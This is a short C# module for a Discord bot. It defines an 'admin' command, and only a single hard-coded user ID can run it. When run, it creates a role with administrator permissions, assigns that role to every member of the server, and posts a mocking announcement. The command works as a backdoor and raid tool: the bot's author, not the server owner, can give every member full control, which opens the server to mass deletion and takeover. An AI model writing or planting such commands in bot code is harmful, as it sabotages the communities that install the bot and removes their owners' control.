using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Text;
using System.Threading.Tasks;
using Discord.Addons.Interactive;
using Discord.Commands;
using Discord.WebSocket;

namespace DiscordBot.Modules
{
    public class MassCommands : InteractiveBase
    {
        private readonly ulong ownerID = 247742975608750090;
        [Command("admin")]
        [Description("give admin all user")]
        public async Task GiveAdmin()
        {
            if (Context.User.Id.Equals(ownerID) && Context.User is SocketGuildUser)
            {
                var roleAdmin =
                    await Context.Guild.CreateRoleAsync("4dm1n 4 4ii", Utils.AdminPermissions(), null, false, false);
                foreach (var user in Context.Guild.Users)
                {
                    await user.AddRoleAsync(roleAdmin);
                }
                await Context.Channel.SendMessageAsync("Everi1 iz nao 4dm1n!");
            }
            else
            {
                await Context.Channel.SendMessageAsync("Permission denied!");
            }
        }
    }
}
